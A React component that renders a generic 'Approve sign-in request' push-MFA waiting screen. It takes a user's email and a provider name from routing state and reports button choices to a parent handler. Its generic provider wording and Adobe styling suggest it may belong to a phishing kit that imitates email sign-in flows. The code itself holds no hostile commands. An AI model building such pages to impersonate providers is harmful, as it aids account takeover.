import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface OthersAuthPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const OthersAuthPromptPage: React.FC<OthersAuthPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const deviceName = (data.deviceName as string) || (data.device as string) || 'your device';
  const providerName = (data.providerName as string) || 'Your email provider';

  return (
    <div className="min-h-screen flex flex-col bg-[#f5f5f5]" style={{ fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[440px] bg-white rounded-lg shadow p-8">
          <h1 className="text-[22px] leading-7 font-semibold text-[#222] text-center mb-2">Approve sign-in request</h1>
          <p className="text-sm text-[#555] text-center mb-8">
            {providerName} sent a notification to <strong>{deviceName}</strong>. Open the app on your device and tap <strong>Approve</strong> to continue.
          </p>
          {email && (
            <div className="text-xs text-gray-500 text-center mb-4">Signed in as {email}</div>
          )}

          <div className="flex flex-col items-center justify-center py-8">
            <div className="relative w-24 h-24 flex items-center justify-center mb-4">
              <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: '#e6f0ff' }}></div>
              <div
                className="absolute inset-0 rounded-full border-4 border-transparent"
                style={{ borderTopColor: '#0066cc', animation: 'othersSpin 1.1s linear infinite' }}
              ></div>
              <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#0066cc" strokeWidth="1.8">
                <rect x="6" y="2" width="12" height="20" rx="2" />
                <circle cx="12" cy="18" r="1.2" fill="#0066cc" />
              </svg>
            </div>
            <style>{`@keyframes othersSpin { to { transform: rotate(360deg); } }`}</style>
            <p className="text-sm font-medium" style={{ color: '#0066cc' }}>Waiting for approval&hellip;</p>
          </div>

          <p className="text-xs text-gray-600 text-center mb-6">
            This page will update automatically once you approve the request.
          </p>

          <div className="flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_prompt')}
              className="hover:underline"
              style={{ color: '#0066cc' }}
            >
              Send a new request
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="hover:underline"
              style={{ color: '#0066cc' }}
            >
              Use another method
            </button>
          </div>

          <button
            type="button"
            onClick={() => onAction('deny_authenticator')}
            className="mt-6 w-full py-2 border rounded-md text-sm font-medium"
            style={{ borderColor: '#0066cc', color: '#0066cc' }}
          >
            This wasn&rsquo;t me
          </button>
        </div>
      </main>
    </div>
  );
};

export default OthersAuthPromptPage;
